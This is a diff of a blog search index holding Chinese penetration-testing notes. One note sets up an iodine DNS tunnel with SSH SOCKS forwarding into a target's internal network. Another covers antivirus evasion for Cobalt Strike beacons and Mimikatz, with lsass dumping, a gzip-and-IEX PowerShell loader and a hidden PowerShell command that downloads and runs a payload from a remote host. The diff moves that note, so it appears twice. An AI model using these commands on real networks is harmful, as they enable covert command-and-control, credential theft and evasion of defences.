@@ -1,6 +1,48 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Iodine搭建DNS隧道</title>
+    <url>/2020/12/18/DNS%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/</url>
+    <content><![CDATA[<p>之前研究了DNS Beacon免杀，但是上线之后速度实在太慢，还是需要搭建sock代理。比较常见的有dns2cat、dns2tcp、iodine。</p>
+<h3 id="Iodine"><a href="#Iodine" class="headerlink" title="Iodine"></a>Iodine</h3><h5 id="1-服务端"><a href="#1-服务端" class="headerlink" title="1.服务端"></a>1.服务端</h5><p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glsb51s8i8j31l20bo76g.jpg" alt="image-20201218151202459"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -f  在前台运行</span><br><span class="line"># -c  禁止检查所有传入请求的客户端 IP 地址</span><br><span class="line"># -P  客户端和服务器之间用于验证身份的密码</span><br><span class="line"># -D  指定调试级别。-DD指的是二级，D的数量随等级增加</span><br><span class="line"># 192.168.0.1  是自定义的局域网虚拟 IP 地址</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iodined -f -c -P zp857 10.1.1.1 dns1.knewpwp.cn -DD</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://code.kryo.se/iodine/check-it/">https://code.kryo.se/iodine/check-it/</a></p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glsb5allnpj30ye0igadb.jpg" alt="image-20201218151233560"></p>
+<h5 id="2-客户端"><a href="#2-客户端" class="headerlink" title="2.客户端"></a>2.客户端</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iodine.exe -f -P zp857 dns1.knewpwp.cn</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glsb5ceeg5j31320jmjst.jpg" alt="image-20201218151443898"></p>
+<p>管理员权限执行，这时服务端和客户端都多出一张网卡</p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glsb5g52ocj311o0imgmr.jpg" alt="image-20201218171451317"></p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glsb5iuq7xj30xm066tb5.jpg" alt="image-20201218171341392"></p>
+<blockquote>
+<p>测试发现WIN10虽然网卡增加了，但是ping不通，即通道并没有建立成功</p>
+<p>win7实测成功</p>
+</blockquote>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glsb5kugvkj310k0d2gm9.jpg" alt="image-20201218170352780"></p>
+<h5 id="3-需要安装tap的情况"><a href="#3-需要安装tap的情况" class="headerlink" title="3.需要安装tap的情况"></a>3.需要安装tap的情况</h5><p>tap-windows-9.9.2_3.exe</p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glsb5n5hp1j30yu05o74i.jpg" alt="image-20201218153207869"></p>
+<p>安装openvpn中的TAP即可</p>
+<h5 id="4-ssh端口转发"><a href="#4-ssh端口转发" class="headerlink" title="4.ssh端口转发"></a>4.ssh端口转发</h5><p>目前在我们的vps上多了一张目标机器的内网网卡，我们需要本地访问内网。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -N -D 8080 user@10.1.1.1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-N 指示SSH不要启动shell，因为我们只是想创建代理</span><br><span class="line">-D 设置动态端口转发，SOCKS代理端口为8080</span><br><span class="line">user 我们服务器上的用户</span><br><span class="line">10.0.1.1 tun接口上的iodine服务器</span><br></pre></td></tr></table></figure>
+
+<p>[注意配置socks5]</p>
+<p>访问vps新增网卡</p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glsb5p32jhj312x0u0q6z.jpg" alt="image-20201218162854141"></p>
+<p>访问目标机器</p>
+<p><img src="../../../typora/images/DNS%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/image-20201218171538892.png" alt="image-20201218171538892"></p>
+<p>速度杠杠的！！</p>
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.freebuf.com/articles/system/178214.html">https://www.freebuf.com/articles/system/178214.html</a></p>
+]]></content>
+      <tags>
+        <tag>代理</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>pingtunnel搭建icmp隧道</title>
     <url>/2020/10/30/pingtunnel%E6%90%AD%E5%BB%BAicmp%E9%9A%A7%E9%81%93/</url>
     <content><![CDATA[<h4 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h4><p>这次实战中遇到了DNS、TCP不出网，ICMP出网的情况，而reGeorg不够稳定，于是考虑搭建ICMP隧道转发socks5流量。</p>
@@ -28,6 +70,64 @@
 ]]></content>
       <tags>
         <tag>代理</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>免杀笔记</title>
+    <url>/2020/12/17/%E5%85%8D%E6%9D%80%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h3 id="http-beacon免杀"><a href="#http-beacon免杀" class="headerlink" title="http beacon免杀"></a>http beacon免杀</h3><blockquote>
+<p>实测免杀效果好的几种方式</p>
+</blockquote>
+<h5 id="1-python"><a href="#1-python" class="headerlink" title="1.python"></a>1.python</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">远程加载shellcode+反序列化</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://mp.weixin.qq.com/s/-xpNqk-gx6iv-HB1mloH9w">https://mp.weixin.qq.com/s/-xpNqk-gx6iv-HB1mloH9w</a></p>
+<h5 id="2-ShellcodeLoad"><a href="#2-ShellcodeLoad" class="headerlink" title="2.ShellcodeLoad"></a>2.ShellcodeLoad</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">自带多种加载方式。32位自带13种加载方式，64位自带12种加载方式。</span><br><span class="line">支持拓展。如果发现新的利用方式，按指定方式开发模板即可。</span><br><span class="line">shellcode自动随机加密。使用时间为种子，生成128位密钥进行加密，相同shellcode出来的加载器的md5也不相同。</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://github.com/knownsec/shellcodeloader">https://github.com/knownsec/shellcodeloader</a></p>
+<h5 id="3-掩日"><a href="#3-掩日" class="headerlink" title="3.掩日"></a>3.掩日</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.0版本参考了 Avitor 的结构。使用了 DotNetToJscript 的代码。部分代码参考了网络资料。</span><br><span class="line">2.0版本修改使用了很多网络代码，因为各种转载，来源已不可考，在此表示感谢❤。</span><br><span class="line">3.0版本基于TheWover,Odzhan 的 Donut 项目，他们的技术水平及开源精神令人敬佩。3.0只是在他们的基础上做了一点微小的图形化工作。</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://github.com/1y0n/AV_Evasion_Tool">https://github.com/1y0n/AV_Evasion_Tool</a></p>
+<h5 id="4-dll免杀"><a href="#4-dll免杀" class="headerlink" title="4.dll免杀"></a>4.dll免杀</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C格式shellcode异或加密写入dll文件</span><br><span class="line">当dll被调用或者被注入进其他进程时触发功能</span><br><span class="line">dll功能：解密shellcode并将其注入rundll32.exe进程</span><br></pre></td></tr></table></figure>
+
+<h5 id="5-重明"><a href="#5-重明" class="headerlink" title="5.重明"></a>5.重明</h5><p><a href="https://github.com/lengjibo/FourEye">https://github.com/lengjibo/FourEye</a></p>
+<h3 id="Mimikatz免杀"><a href="#Mimikatz免杀" class="headerlink" title="Mimikatz免杀"></a>Mimikatz免杀</h3><h5 id="1-xencrypt"><a href="#1-xencrypt" class="headerlink" title="1.xencrypt"></a>1.xencrypt</h5><p><a href="https://blog.csdn.net/lhh134/article/details/104640758">https://blog.csdn.net/lhh134/article/details/104640758</a></p>
+<p>绕不过window defence2012</p>
+<h5 id="2-procdump"><a href="#2-procdump" class="headerlink" title="2.procdump"></a>2.procdump</h5><p>绕不过window defence2012，生成的lsass.dmp被删</p>
+<h5 id="3-sqlDumper-exe"><a href="#3-sqlDumper-exe" class="headerlink" title="3.sqlDumper.exe"></a>3.sqlDumper.exe</h5><p>绕过window defence2012，但是本地解密报错</p>
+<h5 id="4-mimikatz-exe免杀"><a href="#4-mimikatz-exe免杀" class="headerlink" title="4.mimikatz.exe免杀"></a>4.mimikatz.exe免杀</h5><p>也绕不过window defence2012</p>
+<h3 id="DNS-beacon免杀"><a href="#DNS-beacon免杀" class="headerlink" title="DNS beacon免杀"></a>DNS beacon免杀</h3><blockquote>
+<p>能成功上线的是beacon(stageless)</p>
+<p>这种beacon的特点是payload体积庞大，生成的RAW Payload也是一个完整Shellcode Loader的PE文件（约200KB）而不是一段shellcode（不足1KB）</p>
+<p>CS4中的DNS Beacon才是真正纯粹的DNS隧道，前作中大家常用的方式都是以http的形式传递stage</p>
+</blockquote>
+<blockquote>
+<p>那么上面看到的两种beacon有什么区别呢？查阅官方说明，翻译并归纳总结如下。<br>CS的马有两大类：一种是和灰鸽子类似的马，本身是带有完整功能的二进制程序；另一种马短小精悍，也是平时自己diy免杀马常用的，分为三个部分——攻击载荷（payload）、传输器（stager）和传输体（stage），传输器通过下载传输体将其拼接成真正可以回连teamserver的马子（payload），从而达到比较出色的伪装效果。<br>上面图中的那类stageless，顾名思义就是没有stager和stage的马，而是直接以payload为模版生成一个完整的二进制马，当然特征也是最明显的。</p>
+</blockquote>
+<h5 id="1-shellcode免杀"><a href="#1-shellcode免杀" class="headerlink" title="1.shellcode免杀"></a>1.shellcode免杀</h5><p>有个大问题就是，payload generator只支持32位</p>
+<p><a href="https://i.hacking8.com/exe2shellcode/">https://i.hacking8.com/exe2shellcode/</a></p>
+<p>一开始想把64位的stageless先转成shellcode，再免杀，但是这里的转化似乎有问题，测试失败。</p>
+<h5 id="2-ps1免杀"><a href="#2-ps1免杀" class="headerlink" title="2.ps1免杀"></a>2.ps1免杀</h5><p><a href="https://www.cnblogs.com/forforever/p/13882312.html">https://www.cnblogs.com/forforever/p/13882312.html</a></p>
+<img src="https://tva1.sinaimg.cn/large/0081Kckwly1glsb69myr1j30nk0es0v0.jpg" alt="image-20201218000952528" style="zoom:50%;" />
+
+
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell -exec bypass -file beacon.ps1</span><br></pre></td></tr></table></figure>
+
+<p>由于是stageless，这里的字符串比较长，本地写个python脚本转化</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Byte[]]$acode &#x3D;  [Byte[]](这里放刚刚转码后的FromBase65String)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glsb67syf5j31dk094aau.jpg" alt="image-20201217234030047"></p>
+<img src="https://tva1.sinaimg.cn/large/0081Kckwly1glsb65u4urj30og0k00vf.jpg" alt="image-20201218001110085" style="zoom:50%;" />
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Byte[]]$var_c1 &#x3D;  [Byte[]](31,139,8,0,0,0,0,0,0,0,173)</span><br><span class="line">[Byte[]]$var_c2 &#x3D;  [Byte[]](199,96,206,103,88,42,4,0,0)</span><br><span class="line">$var_code&#x3D;$var_c1+$var_c2</span><br><span class="line"></span><br><span class="line">$s&#x3D;New-Object IO.MemoryStream(,$var_code);IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>因为不出http，利用边界机本身的web服务下载，成功上线</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;10.133.104.165:8081&#x2F;FCKEditor&#x2F;zp857&#39;))&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glsb63u5aqj31ni0tiq8f.jpg" alt="image-20201218172947047"></p>
+]]></content>
+      <tags>
+        <tag>免杀</tag>
       </tags>
   </entry>
   <entry>
@@ -129,64 +229,6 @@
 ]]></content>
       <tags>
         <tag>爆破</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>免杀笔记</title>
-    <url>/2020/12/17/%E5%85%8D%E6%9D%80%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<h3 id="http-beacon免杀"><a href="#http-beacon免杀" class="headerlink" title="http beacon免杀"></a>http beacon免杀</h3><blockquote>
-<p>实测免杀效果好的几种方式</p>
-</blockquote>
-<h5 id="1-python"><a href="#1-python" class="headerlink" title="1.python"></a>1.python</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">远程加载shellcode+反序列化</span><br></pre></td></tr></table></figure>
-
-<p><a href="https://mp.weixin.qq.com/s/-xpNqk-gx6iv-HB1mloH9w">https://mp.weixin.qq.com/s/-xpNqk-gx6iv-HB1mloH9w</a></p>
-<h5 id="2-ShellcodeLoad"><a href="#2-ShellcodeLoad" class="headerlink" title="2.ShellcodeLoad"></a>2.ShellcodeLoad</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">自带多种加载方式。32位自带13种加载方式，64位自带12种加载方式。</span><br><span class="line">支持拓展。如果发现新的利用方式，按指定方式开发模板即可。</span><br><span class="line">shellcode自动随机加密。使用时间为种子，生成128位密钥进行加密，相同shellcode出来的加载器的md5也不相同。</span><br></pre></td></tr></table></figure>
-
-<p><a href="https://github.com/knownsec/shellcodeloader">https://github.com/knownsec/shellcodeloader</a></p>
-<h5 id="3-掩日"><a href="#3-掩日" class="headerlink" title="3.掩日"></a>3.掩日</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.0版本参考了 Avitor 的结构。使用了 DotNetToJscript 的代码。部分代码参考了网络资料。</span><br><span class="line">2.0版本修改使用了很多网络代码，因为各种转载，来源已不可考，在此表示感谢❤。</span><br><span class="line">3.0版本基于TheWover,Odzhan 的 Donut 项目，他们的技术水平及开源精神令人敬佩。3.0只是在他们的基础上做了一点微小的图形化工作。</span><br></pre></td></tr></table></figure>
-
-<p><a href="https://github.com/1y0n/AV_Evasion_Tool">https://github.com/1y0n/AV_Evasion_Tool</a></p>
-<h5 id="4-dll免杀"><a href="#4-dll免杀" class="headerlink" title="4.dll免杀"></a>4.dll免杀</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C格式shellcode异或加密写入dll文件</span><br><span class="line">当dll被调用或者被注入进其他进程时触发功能</span><br><span class="line">dll功能：解密shellcode并将其注入rundll32.exe进程</span><br></pre></td></tr></table></figure>
-
-<h5 id="5-重明"><a href="#5-重明" class="headerlink" title="5.重明"></a>5.重明</h5><p><a href="https://github.com/lengjibo/FourEye">https://github.com/lengjibo/FourEye</a></p>
-<h3 id="Mimikatz免杀"><a href="#Mimikatz免杀" class="headerlink" title="Mimikatz免杀"></a>Mimikatz免杀</h3><h5 id="1-xencrypt"><a href="#1-xencrypt" class="headerlink" title="1.xencrypt"></a>1.xencrypt</h5><p><a href="https://blog.csdn.net/lhh134/article/details/104640758">https://blog.csdn.net/lhh134/article/details/104640758</a></p>
-<p>绕不过window defence2012</p>
-<h5 id="2-procdump"><a href="#2-procdump" class="headerlink" title="2.procdump"></a>2.procdump</h5><p>绕不过window defence2012，生成的lsass.dmp被删</p>
-<h5 id="3-sqlDumper-exe"><a href="#3-sqlDumper-exe" class="headerlink" title="3.sqlDumper.exe"></a>3.sqlDumper.exe</h5><p>绕过window defence2012，但是本地解密报错</p>
-<h5 id="4-mimikatz-exe免杀"><a href="#4-mimikatz-exe免杀" class="headerlink" title="4.mimikatz.exe免杀"></a>4.mimikatz.exe免杀</h5><p>也绕不过window defence2012</p>
-<h3 id="DNS-beacon免杀"><a href="#DNS-beacon免杀" class="headerlink" title="DNS beacon免杀"></a>DNS beacon免杀</h3><blockquote>
-<p>能成功上线的是beacon(stageless)</p>
-<p>这种beacon的特点是payload体积庞大，生成的RAW Payload也是一个完整Shellcode Loader的PE文件（约200KB）而不是一段shellcode（不足1KB）</p>
-<p>CS4中的DNS Beacon才是真正纯粹的DNS隧道，前作中大家常用的方式都是以http的形式传递stage</p>
-</blockquote>
-<blockquote>
-<p>那么上面看到的两种beacon有什么区别呢？查阅官方说明，翻译并归纳总结如下。<br>CS的马有两大类：一种是和灰鸽子类似的马，本身是带有完整功能的二进制程序；另一种马短小精悍，也是平时自己diy免杀马常用的，分为三个部分——攻击载荷（payload）、传输器（stager）和传输体（stage），传输器通过下载传输体将其拼接成真正可以回连teamserver的马子（payload），从而达到比较出色的伪装效果。<br>上面图中的那类stageless，顾名思义就是没有stager和stage的马，而是直接以payload为模版生成一个完整的二进制马，当然特征也是最明显的。</p>
-</blockquote>
-<h5 id="1-shellcode免杀"><a href="#1-shellcode免杀" class="headerlink" title="1.shellcode免杀"></a>1.shellcode免杀</h5><p>有个大问题就是，payload generator只支持32位</p>
-<p><a href="https://i.hacking8.com/exe2shellcode/">https://i.hacking8.com/exe2shellcode/</a></p>
-<p>一开始想把64位的stageless先转成shellcode，再免杀，但是这里的转化似乎有问题，测试失败。</p>
-<h5 id="2-ps1免杀"><a href="#2-ps1免杀" class="headerlink" title="2.ps1免杀"></a>2.ps1免杀</h5><p><a href="https://www.cnblogs.com/forforever/p/13882312.html">https://www.cnblogs.com/forforever/p/13882312.html</a></p>
-<img src="https://tva1.sinaimg.cn/large/0081Kckwly1glsb69myr1j30nk0es0v0.jpg" alt="image-20201218000952528" style="zoom:50%;" />
-
-
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell -exec bypass -file beacon.ps1</span><br></pre></td></tr></table></figure>
-
-<p>由于是stageless，这里的字符串比较长，本地写个python脚本转化</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Byte[]]$acode &#x3D;  [Byte[]](这里放刚刚转码后的FromBase65String)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glsb67syf5j31dk094aau.jpg" alt="image-20201217234030047"></p>
-<img src="https://tva1.sinaimg.cn/large/0081Kckwly1glsb65u4urj30og0k00vf.jpg" alt="image-20201218001110085" style="zoom:50%;" />
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Byte[]]$var_c1 &#x3D;  [Byte[]](31,139,8,0,0,0,0,0,0,0,173)</span><br><span class="line">[Byte[]]$var_c2 &#x3D;  [Byte[]](199,96,206,103,88,42,4,0,0)</span><br><span class="line">$var_code&#x3D;$var_c1+$var_c2</span><br><span class="line"></span><br><span class="line">$s&#x3D;New-Object IO.MemoryStream(,$var_code);IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>因为不出http，利用边界机本身的web服务下载，成功上线</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;10.133.104.165:8081&#x2F;FCKEditor&#x2F;zp857&#39;))&quot;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glsb63u5aqj31ni0tiq8f.jpg" alt="image-20201218172947047"></p>
-]]></content>
-      <tags>
-        <tag>免杀</tag>
       </tags>
   </entry>
 </search>
